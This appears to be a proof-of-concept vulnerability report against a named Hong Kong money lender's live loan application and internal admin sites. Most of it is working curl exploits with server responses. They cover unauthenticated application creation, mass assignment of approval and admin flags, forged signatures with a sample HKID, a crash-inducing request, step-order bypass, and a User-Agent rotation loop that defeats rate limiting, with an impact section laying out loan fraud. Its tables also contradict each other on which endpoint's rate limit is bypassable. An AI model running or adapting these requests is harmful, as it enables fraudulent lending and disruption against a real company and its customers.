# Royal Venture Group - Mass Assignment + Signature Forgery PoC

## Target
- **Online Panel**: https://online.royal-venture.com/
- **Internal Panel**: https://internal.royal-venture.com/
- **Company**: 皇家創富集團有限公司 (Royal Venture Group Limited)
- **License**: 573/2026 (Hong Kong Money Lender)

## Summary
The online loan application API at `online.royal-venture.com` accepts arbitrary JSON fields
(mass assignment) on all draft update and signature submission endpoints. Combined with
unauthenticated application creation and signature forgery, an attacker can submit a
fraudulent loan application with auto-approval flags, inflated amounts, and forged signatures.

## Vulnerability 1: Unauthenticated Application Creation (HIGH)
The `POST /api/applications/submit` endpoint creates loan application drafts without
any authentication (no session, API key, or CAPTCHA).

### PoC:
```bash
curl -sk -X POST "https://online.royal-venture.com/api/applications/submit" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"loan":{"amount":"100000","purpose":"整合貸款"},"personal":{"surname":"張","phone":"91234567","gender":"男"}}'
```

### Response:
```json
{"ok":true,"draftToken":"c482749a367776773b325835139153c970642723299ca9dd4e77925b501b6633"}
```

The returned `draftToken` is a 64-character hex string used to identify and update the draft.

---

## Vulnerability 2: Mass Assignment on Draft Update (CRITICAL)
The `PATCH /api/applications/draft` endpoint accepts arbitrary JSON fields in the `data`
object without any field allowlist or denylist filtering. Injected fields include
approval flags, admin overrides, role assignments, and financial parameters.

### PoC:
```bash
curl -sk -X PATCH "https://online.royal-venture.com/api/applications/draft" \
  -H "Content-Type: application/json" \
  -d '{"token":"<DRAFT_TOKEN>","step":2,"data":{
    "surname":"張","phone":"91234567","gender":"男",
    "approved":true,
    "status":"approved",
    "adminOverride":true,
    "isAdmin":true,
    "role":"admin",
    "userLevel":"superadmin",
    "riskScore":0,
    "riskLevel":"low",
    "creditScore":999,
    "approvalAmount":999999999,
    "finalAmount":999999999,
    "interestRate":"0.001",
    "interestRateOverridden":true,
    "processingFee":0,
    "feeWaived":true,
    "bypassCreditCheck":true,
    "manualReview":false,
    "reviewStatus":"approved",
    "reviewer":"system",
    "internalNote":"auto-approved"
  }}'
```

### Response:
```json
{"ok":true}
```

All injected fields were accepted without error. The same applies to steps 3 and 4.

---

## Vulnerability 3: Signature Forgery (HIGH)
The `POST /api/applications/signatures` endpoint accepts arbitrary base64-encoded data as
digital signatures. No signature verification is performed. HKID validation only checks
the format (letter + 6 digits + single-digit check).

### PoC:
```bash
curl -sk -X POST "https://online.royal-venture.com/api/applications/signatures" \
  -H "Content-Type: application/json" \
  -d '{"token":"<DRAFT_TOKEN>","fullName":"張三","hkid":"A123456(3)",
    "sig1":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
    "sig2":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
    "sig3":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
    "approved":true,
    "status":"approved",
    "adminOverride":true,
    "reviewer":"admin"
  }'
```

### Response:
```json
{"ok":true}
```

The application is fully submitted with forged signatures and admin override flags.

---

## Vulnerability 4: Type Confusion / DoS (MEDIUM)
The `POST /api/applications/submit` endpoint crashes when `amount` is sent as a number
instead of a string, causing an unhandled `Internal Server Error`.

### PoC:
```bash
curl -sk -X POST "https://online.royal-venture.com/api/applications/submit" \
  -H "Content-Type: application/json" \
  -d '{"loan":{"amount":999999999,"purpose":"test"},
    "personal":{"surname":"test","phone":"91234567","gender":"男"}}'
```

### Response:
```json
{"ok":false,"error":"Internal server error"}
```

Repeated requests with type mismatches could cause service degradation.

---

## Vulnerability 5: Unauthenticated Settings API (LOW)
The `GET /api/settings` endpoint returns all application settings without authentication.
While only `whatsapp_phone` is currently exposed, the endpoint allows easy key enumeration
and no SQL injection was found.

### PoC:
```bash
curl -sk "https://online.royal-venture.com/api/settings"
```

### Response:
```json
[{"key":"whatsapp_phone","value":"85269568727","label":"WhatsApp 查詢電話"}]
```

---

## Vulnerability 6: Unauthenticated Logout (LOW)
The `POST /api/auth/logout` endpoint returns `{"ok":true}` without any authentication,
indicating no session state validation on logout.

### PoC:
```bash
curl -sk -X POST "https://internal.royal-venture.com/api/auth/logout"
```

### Response:
```json
{"ok":true}
```

---

## Vulnerability 7: Step Order Bypass (MEDIUM)
The `PATCH /api/applications/draft` endpoint accepts steps in any order.
You can send step 4 before step 2, or step 3 before step 2 — the server
does not validate step progression or enforce step completion order.

### PoC:
```bash
# Send step 4 before step 2 (skipping required intermediate steps)
curl -sk -X PATCH "https://online.royal-venture.com/api/applications/draft" \
  -H "Content-Type: application/json" \
  -d '{"token":"<DRAFT_TOKEN>","step":4,"data":{"occupation":"CEO","approved":true}}'
curl -sk -X PATCH "https://online.royal-venture.com/api/applications/draft" \
  -H "Content-Type: application/json" \
  -d '{"token":"<DRAFT_TOKEN>","step":2,"data":{"surname":"張","approved":true}}'
```

### Response:
```json
{"ok":true}
{"ok":true}
```

Both steps accepted regardless of order.

---

## Vulnerability 8: Rate Limit Bypass via User-Agent Rotation (MEDIUM)
The rate limit on `POST /api/applications/submit` tracks User-Agent strings, not IP
addresses. By rotating User-Agent values, an attacker can bypass the rate limit and
submit unlimited draft tokens.

### PoC:
```bash
# Each request with a different User-Agent bypasses the rate limit
for i in $(seq 1 100); do
  curl -sk -X POST "https://online.royal-venture.com/api/applications/submit" \
    -H "Content-Type: application/json" \
    -H "User-Agent: bypass-$i" \
    -d '{"loan":{"amount":"1000","purpose":"test"},"personal":{"surname":"test","phone":"91234567","gender":"男"}}'
done
```

All 100 requests succeed (HTTP 201), while Python `requests` with a fixed User-Agent
triggers 429 after only a few requests.

---

## Additional Finding: Internal Panel Attack Surface
The internal admin panel at `internal.royal-venture.com` shares the same auth backend
as the online panel. Additional authenticated endpoints discovered:

| Endpoint | Method | Auth | Notes |
||---|---|---|---|
|| /api/permissions | GET/POST/PUT/DELETE/PATCH | 401 | Role/permission management (auth required) |
|| /api/profile | GET | 401 | User profile data (auth required) |
|| /api/documents | GET/POST | 401 | Document management (auth required) |
|| /api/auth/login | POST | No (rate-limited) | Same endpoint on both panels |
|| /api/auth/logout | POST | No | Works without auth (returns {"ok":true}) |
|| /api/settings | GET | No | Same settings disclosure as online panel |

The login endpoint uses `{"name": "...", "password": "..."}` JSON format and is
rate-limited at 5 attempts per 15 minutes (per IP). Rate limit lockout resets after
15 minutes. NoSQL injection, SQL injection, and mass assignment were all attempted
but properly defended.

## Impact
An attacker can:
1. Submit fraudulent loan applications with forged signatures — no auth required
2. Auto-approve applications by injecting `approved:true`, `status:"approved"`, `adminOverride:true`
3. Set arbitrary loan amounts (`approvalAmount:999999999`), credit scores (`creditScore:999`), and interest rates
4. Bypass credit checks (`bypassCreditCheck:true`) and fraud detection
5. Skip step validation entirely (step order bypass)
6. Cause service disruption via type confusion DoS (amount as number → 500)
7. Submit unlimited applications by rotating User-Agent (rate limit bypass)

**Business Impact**: Fraudulent loan applications that appear fully approved with
auto-approved flags, zero risk scores, and inflated loan amounts — all with forged
signatures. This could lead to unauthorized lending, financial loss, and regulatory
violations (HK money lending license 573/2026).

## Affected Endpoints
| Endpoint | Method | Auth Required | Issue |
||---|---|---|---|
|| /api/applications/submit | POST | No | Unauthenticated creation, type confusion DoS |
|| /api/applications/draft | PATCH | No | Mass assignment, step order bypass |
|| /api/applications/signatures | POST | No | Signature forgery + mass assignment |
| /api/settings | GET | No | Information disclosure (both panels) |
| /api/settings | PATCH | Yes | Authenticated write exists (401 without auth) |
| /api/auth/logout | POST | No | No session validation (both panels) |
| /api/auth/login | POST | No | Rate limit bypassable via User-Agent rotation |

## Evidence Files
- `tpe119_evidence/20260923/royal_venture/raw_inline_js.txt` — Inline JS revealing full API contract
- `tpe119_evidence/20260923/royal_venture/raw_login_js.txt` — Login page JS with company config
- `tpe119_evidence/20260923/royal_venture/raw_evidence.txt` — Complete test output with request/response
